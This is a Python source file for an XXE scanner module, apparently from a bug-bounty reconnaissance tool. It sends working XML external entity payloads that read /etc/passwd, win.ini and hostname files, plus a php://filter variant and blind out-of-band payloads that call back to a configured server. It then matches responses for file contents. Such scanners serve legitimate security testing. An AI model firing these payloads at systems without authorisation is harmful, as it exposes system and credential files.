import re
from core.ui import vuln, found, CYN, RED, GRY, RESET, info
from core.http import http_probe
from core.config import CONFIG
from core.utils import generate_oob_id
from . import BaseScanner
import logging
logger = logging.getLogger("bb-recon")

XXE_CLASSIC_PAYLOADS = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "file:///etc/passwd",
        "Classic XXE (Linux passwd)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "file:///c:/windows/win.ini",
        "Classic XXE (Windows win.ini)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        "file:///etc/hostname",
        "Classic XXE (hostname)",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        "php://filter",
        "XXE via PHP filter",
    ),
]

XXE_PARAMETER_ENTITY = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'file:///dev/null\'>">%eval;]><root>&exfil;</root>',
        "Parameter Entity",
    ),
]

XXE_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

XXE_EVIDENCE = re.compile(
    r"(root:[x*]:0:0|bin/bash|bin/sh|\[extensions\]|\[boot loader\]|\[fonts\]"
    r"|PD9waH|cm9vd|127\.0\.0\.1\s+localhost)", re.I
)

class XXEScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()

        for ct in XXE_CONTENT_TYPES:
            for payload, target_file, desc in XXE_CLASSIC_PAYLOADS:
                try:
                    code, body, hdrs, ms = await http_probe(
                        self.session, url, timeout=10, method="POST",
                        data=payload,
                        extra_headers={"Content-Type": ct}
                    )
                    await self._waf_sleep()

                    if code in (403, 406, 429, 503):
                        continue

                    if code and body and XXE_EVIDENCE.search(body):
                        m = XXE_EVIDENCE.search(body)
                        vuln(f"XXE CONFIRMED ({desc}): {url}")
                        print(GRY+"│    "+RESET+CYN+f"Content-Type: {ct}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"evidence: {m.group(0)[:80]}"+RESET)
                        findings.append({
                            "type": "XXE", "url": url, "payload": payload[:200],
                            "content_type": ct, "evidence": m.group(0)[:120],
                            "technique": desc, "severity": "CRITICAL",
                        })
                        return findings

                    if code == 200 and body:
                        import base64
                        b64_match = re.search(r"([A-Za-z0-9+/]{40,}={0,2})", body)
                        if b64_match and "php://filter" in payload:
                            try:
                                decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="ignore")
                                if XXE_EVIDENCE.search(decoded) or len(decoded) > 20:
                                    vuln(f"XXE via PHP filter (base64): {url}")
                                    findings.append({
                                        "type": "XXE-phpfilter", "url": url,
                                        "evidence": decoded[:200], "severity": "CRITICAL",
                                    })
                                    return findings
                            except Exception:
                                pass

                except Exception as e:
                    logger.debug(f"XXE probe failed on {url}: {e}")
                    continue

        if CONFIG.oob_server:
            oob_id = generate_oob_id()
            blind_payloads = [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob_id}.{CONFIG.oob_server}/xxe">%xxe;]><root>test</root>',
                f'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://{oob_id}.{CONFIG.oob_server}/dtd"><root>test</root>',
            ]
            for bp in blind_payloads:
                for ct in XXE_CONTENT_TYPES[:2]:
                    try:
                        await http_probe(
                            self.session, url, timeout=8, method="POST",
                            data=bp, extra_headers={"Content-Type": ct}
                        )
                        await self._waf_sleep()
                    except Exception:
                        pass
            info(f"Blind XXE payloads sent (check {CONFIG.oob_server} for {oob_id})")
            findings.append({
                "type": "XXE-OOB", "url": url, "oob_id": oob_id,
                "severity": "HIGH", "confidence": "POSSIBLE",
                "note": f"Check {CONFIG.oob_server} for DNS/HTTP callback from {oob_id}",
            })

        return findings
